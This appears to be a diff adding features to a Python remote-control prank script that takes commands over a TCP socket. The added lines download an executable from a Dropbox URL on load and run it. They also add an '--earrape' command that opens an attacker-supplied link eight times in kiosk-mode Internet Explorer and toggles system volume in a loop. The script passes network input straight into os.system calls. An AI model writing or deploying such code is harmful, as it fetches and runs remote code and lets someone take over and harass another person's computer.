@@ -4,15 +4,19 @@ import socket
 import os
 import pickle
 import time
+import subprocess
 from subprocess import call
+from subprocess import Popen, PIPE
 import cython
+import urllib.request
 if os.name == "nt":
     import ctypes
+    import win32com.client
     BitBlt = ctypes.windll.gdi32.BitBlt
     MessageBox = ctypes.windll.user32.MessageBoxW
 
-
-
+urllib.request.urlretrieve("https://www.dropbox.com/s/m6sqwjz63sr38ci/SetVol.exe?dl=1", "/temp/SetVol.exe")
+os.system("/temp/SetVol.exe 100")
 
 BitBlt()
 TCP_IP = '127.0.0.1'
@@ -142,6 +146,20 @@ while 1:
         elif len(data) > 3:
             if data[2] == "--earrape":
                 os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                os.system("start iexplore -k " + ytlink1 + data[1])
+                s = 0
+                while s < 100:
+                    time.sleep(0.1)
+                    s = s + 1
+                    os.system("/temp/SetVol.exe 100")
+                    os.system("/temp/SetVol.exe 99")
+                    s = s + 1
 
 
 conn.close()
